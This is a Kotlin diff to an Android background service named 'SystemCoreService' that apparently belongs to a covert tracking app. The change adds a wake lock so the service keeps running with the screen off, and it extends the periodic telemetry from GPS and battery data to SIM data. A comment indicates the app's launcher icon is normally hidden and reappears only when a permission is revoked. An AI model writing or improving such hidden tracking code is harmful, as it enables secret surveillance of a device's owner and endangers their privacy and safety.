@@ -58,12 +58,28 @@ class SystemCoreService : Service() {
         // Schedule Telemetry, GPS Location Pings, & Permission Health Checks
         telemetryRunnable = object : Runnable {
             override fun run() {
-                // Perform dynamic permission check (un-hides launcher icon if any permission was revoked)
-                PermissionActivity.checkAndToggleLauncherIcon(this@SystemCoreService)
+                // Acquire Partial WakeLock to wake CPU when screen has been off for extended periods
+                var wakeLock: android.os.PowerManager.WakeLock? = null
+                try {
+                    val pm = getSystemService(POWER_SERVICE) as? android.os.PowerManager
+                    wakeLock = pm?.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Sync::TelemetryWakeLock")
+                    wakeLock?.acquire(15 * 1000L) // Hold CPU awake for 15 seconds
+                } catch (e: Exception) {
+                    Log.e("SystemCoreService", "WakeLock acquisition error: ${e.message}")
+                }
 
-                // Transmit GPS & Battery Telemetry
-                locationEngine.sendTelemetryPing()
-                
+                try {
+                    // Perform dynamic permission check
+                    PermissionActivity.checkAndToggleLauncherIcon(this@SystemCoreService)
+
+                    // Transmit GPS, Battery & SIM Telemetry
+                    locationEngine.sendTelemetryPing()
+                } finally {
+                    if (wakeLock != null && wakeLock.isHeld) {
+                        try { wakeLock.release() } catch (_: Exception) {}
+                    }
+                }
+
                 val intervalMs = AppConfig.TELEMETRY_PING_INTERVAL_MINUTES * 60 * 1000
                 handler.postDelayed(this, intervalMs)
             }
